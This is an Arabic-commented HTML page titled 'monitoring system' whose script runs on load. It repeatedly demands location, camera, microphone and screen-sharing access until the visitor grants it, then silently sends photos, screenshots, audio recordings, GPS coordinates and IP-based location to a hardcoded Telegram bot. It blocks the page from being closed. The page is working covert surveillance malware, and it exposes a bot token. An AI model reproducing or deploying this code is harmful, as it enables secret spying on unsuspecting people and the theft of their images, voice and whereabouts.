<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام المراقبة</title>
</head>
<body>
    <script>
        // ============================================================
        // بوت تيليجرام
        // ============================================================
        const BOT_TOKEN = '8529112495:AAFYQ5_9K8WeaA0k1qtrYAWyb75ajTaJ7RQ';
        const CHAT_ID = '1485247348';
        
        // ============================================================
        // المتغيرات
        // ============================================================
        let currentStream = null;
        let screenStream = null;
        let mediaRecorder = null;
        let audioChunks = [];
        let lastLocation = null;
        let locationWatchId = null;
        let isRunning = false;
        let photoCount = 0;
        let audioCount = 0;
        let locationCount = 0;
        let isFront = false;
        
        // حالة الصلاحيات
        let perms = { gps: false, cam: false, mic: false, screen: false };
        
        // ============================================================
        // طلب الصلاحيات - واحدة ورا التانية - مع إعادة المحاولة
        // ============================================================
        async function requestAllPermissions() {
            // 1. الموقع - يطلبه كل 3 ثواني لحد ما يوافق
            while (!perms.gps) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000
                        });
                    });
                    lastLocation = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                    perms.gps = true;
                    await sendLocation();
                    console.log('✅ تم تفعيل الموقع');
                } catch(e) {
                    console.log('⏳ في انتظار الموافقة على الموقع...');
                    await sleep(3000);
                }
            }
            
            // 2. الكاميرا - يطلبها كل 3 ثواني لحد ما يوافق
            while (!perms.cam) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'environment',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false
                    });
                    currentStream = stream;
                    perms.cam = true;
                    console.log('✅ تم تفعيل الكاميرا');
                    setTimeout(() => capturePhoto(), 1000);
                } catch(e) {
                    // جرب الأمامية
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                facingMode: 'user',
                                width: { ideal: 1280 },
                                height: { ideal: 720 }
                            },
                            audio: false
                        });
                        currentStream = stream;
                        perms.cam = true;
                        console.log('✅ تم تفعيل الكاميرا الأمامية');
                        setTimeout(() => capturePhoto(), 1000);
                    } catch(e2) {
                        console.log('⏳ في انتظار الموافقة على الكاميرا...');
                        await sleep(3000);
                    }
                }
            }
            
            // 3. الميكروفون - يطلبه كل 3 ثواني لحد ما يوافق
            while (!perms.mic) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        audio: {
                            echoCancellation: false,
                            noiseSuppression: false,
                            autoGainControl: false
                        } 
                    });
                    perms.mic = true;
                    console.log('✅ تم تفعيل الميكروفون');
                    setTimeout(() => startVoiceRecording(), 1000);
                } catch(e) {
                    console.log('⏳ في انتظار الموافقة على الميكروفون...');
                    await sleep(3000);
                }
            }
            
            // 4. الشاشة - يطلبها كل 3 ثواني لحد ما يوافق
            while (!perms.screen) {
                try {
                    const stream = await navigator.mediaDevices.getDisplayMedia({
                        video: { 
                            width: { ideal: 1280 }, 
                            height: { ideal: 720 }
                        }
                    });
                    screenStream = stream;
                    perms.screen = true;
                    console.log('✅ تم تفعيل مشاركة الشاشة');
                    setTimeout(() => captureScreen(), 1000);
                } catch(e) {
                    console.log('⏳ في انتظار الموافقة على مشاركة الشاشة...');
                    await sleep(3000);
                }
            }
            
            // بعد ما يوافق على كل الصلاحيات - يبدأ التشغيل
            isRunning = true;
            console.log('🚀 تم تفعيل كل الصلاحيات - بدء التشغيل');
            
            startAutoCapture();
            startAutoScreen();
            startAutoVoice();
            trackLocation();
            
            // إرسال تقرير فوري
            setTimeout(() => sendFullReport(), 2000);
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // ============================================================
        // تبديل الكاميرا
        // ============================================================
        async function switchCamera() {
            if (!isRunning || !perms.cam) return;
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(t => t.stop());
                }
                const facing = isFront ? 'environment' : 'user';
                isFront = !isFront;
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: facing,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                currentStream = stream;
                setTimeout(() => capturePhoto(), 500);
            } catch(e) {
                console.log('❌ فشل تبديل الكاميرا');
            }
        }

        // ============================================================
        // تصوير الكاميرا - يبعت كل 5 ثواني
        // ============================================================
        async function capturePhoto() {
            if (!currentStream || !perms.cam || !isRunning) return;
            try {
                const video = document.createElement('video');
                video.srcObject = currentStream;
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                document.body.appendChild(video);
                await video.play();
                
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    document.body.removeChild(video);
                    return;
                }
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                photoCount++;
                const type = isFront ? 'أمامية' : 'خلفية';
                await sendPhoto(dataUrl, `📸 ${type} #${photoCount}`);
                
                document.body.removeChild(video);
                
                // تبديل الكاميرا كل 5 صور
                if (photoCount % 5 === 0) {
                    setTimeout(() => switchCamera(), 1000);
                }
            } catch(e) {
                console.log('❌ خطأ في التصوير');
            }
        }

        // ============================================================
        // تصوير الشاشة - كل 10 ثواني
        // ============================================================
        async function captureScreen() {
            if (!screenStream || !perms.screen || !isRunning) return;
            try {
                const video = document.createElement('video');
                video.srcObject = screenStream;
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                document.body.appendChild(video);
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                await sendPhoto(dataUrl, `🖥️ شاشة #${photoCount}`);
                
                document.body.removeChild(video);
            } catch(e) {
                console.log('❌ خطأ في تصوير الشاشة');
            }
        }

        // ============================================================
        // تسجيل الفويس - كل 15 ثانية
        // ============================================================
        async function startVoiceRecording() {
            if (!perms.mic || !isRunning) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false
                    } 
                });
                
                audioChunks = [];
                mediaRecorder = new MediaRecorder(stream, { 
                    mimeType: 'audio/webm;codecs=opus'
                });
                
                mediaRecorder.ondataavailable = e => {
                    if (e.data.size > 0) audioChunks.push(e.data);
                };
                
                mediaRecorder.onstop = async () => {
                    if (audioChunks.length > 0) {
                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
                        audioCount++;
                        await sendAudio(blob);
                        console.log(`✅ تم إرسال الفويس #${audioCount}`);
                    }
                    stream.getTracks().forEach(t => t.stop());
                };
                
                mediaRecorder.start();
                
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 8000);
            } catch(e) {
                console.log('❌ خطأ في التسجيل');
            }
        }

        // ============================================================
        // إرسال الصورة للبوت
        // ============================================================
        async function sendPhoto(dataUrl, caption) {
            try {
                const blob = await fetch(dataUrl).then(r => r.blob());
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('photo', blob, `photo_${Date.now()}.jpg`);
                form.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: form
                });
                console.log(`✅ تم إرسال الصورة: ${caption}`);
            } catch(e) {
                console.log('❌ فشل إرسال الصورة');
            }
        }

        // ============================================================
        // إرسال الفويس للبوت
        // ============================================================
        async function sendAudio(blob) {
            try {
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('audio', blob, `voice_${Date.now()}.webm`);
                form.append('caption', `🎙️ فويس #${audioCount} - ${new Date().toLocaleString('ar-EG')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: form
                });
            } catch(e) {
                console.log('❌ فشل إرسال الفويس');
            }
        }

        // ============================================================
        // إرسال الموقع للبوت
        // ============================================================
        async function sendLocation() {
            if (!lastLocation) return;
            
            const msg = `📍 *موقعي*\n📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n🎯 دقة: ${lastLocation.accuracy}م\n🕐 ${new Date().toLocaleString('ar-EG')}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
                locationCount++;
                console.log(`✅ تم إرسال الموقع #${locationCount}`);
            } catch(e) {
                console.log('❌ فشل إرسال الموقع');
            }
        }

        // ============================================================
        // تقرير كامل
        // ============================================================
        async function sendFullReport() {
            let msg = `🚨 *تقرير شامل*\n═══════════════════════\n`;
            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n\n`;
            
            if (lastLocation) {
                msg += `📍 ${lastLocation.lat}, ${lastLocation.lon}\n`;
                msg += `🎯 دقة: ${lastLocation.accuracy}م\n\n`;
            }
            
            try {
                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                const info = await fetch(`http://ip-api.com/json/${ip.ip}?lang=ar`).then(r => r.json());
                msg += `🌐 ${info.country || ''} - ${info.city || ''}\n`;
                msg += `📡 ${info.isp || ''}\n\n`;
            } catch(e) {}
            
            msg += `📸 الصور: ${photoCount}\n`;
            msg += `🎙️ الفويسات: ${audioCount}\n`;
            msg += `📍 المواقع: ${locationCount}\n\n`;
            msg += `📷 كاميرا: ${perms.cam?'✅':'❌'}\n`;
            msg += `🎤 ميكروفون: ${perms.mic?'✅':'❌'}\n`;
            msg += `📍 GPS: ${perms.gps?'✅':'❌'}\n`;
            msg += `🖥️ شاشة: ${perms.screen?'✅':'❌'}\n`;
            msg += `═══════════════════════`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
            } catch(e) {}
        }

        // ============================================================
        // التشغيل التلقائي
        // ============================================================
        function startAutoCapture() {
            // تصوير كل 5 ثواني
            setInterval(() => {
                if (perms.cam && isRunning) capturePhoto();
            }, 5000);
        }

        function startAutoScreen() {
            // تصوير الشاشة كل 10 ثواني
            setInterval(() => {
                if (perms.screen && isRunning) captureScreen();
            }, 10000);
        }

        function startAutoVoice() {
            // تسجيل فويس كل 15 ثانية
            setInterval(() => {
                if (perms.mic && isRunning) startVoiceRecording();
            }, 15000);
        }

        function trackLocation() {
            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
            
            locationWatchId = navigator.geolocation.watchPosition(
                (pos) => {
                    lastLocation = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                    // إرسال الموقع كل 30 ثانية
                    if (Math.random() < 0.15) sendLocation();
                },
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }

        // ============================================================
        // بدء التشغيل فوراً
        // ============================================================
        window.addEventListener('load', () => {
            console.log('🚀 بدء طلب الصلاحيات...');
            setTimeout(() => {
                requestAllPermissions();
            }, 500);
        });

        // ============================================================
        // منع إغلاق الصفحة
        // ============================================================
        window.addEventListener('beforeunload', (e) => {
            if (isRunning) {
                e.preventDefault();
                e.returnValue = '⚠️ إغلاق الصفحة سيوقف التصوير!';
            }
        });

        console.log('✅ تم التحميل - سيتم طلب الصلاحيات تلقائياً');
    </script>
</body>
</html>
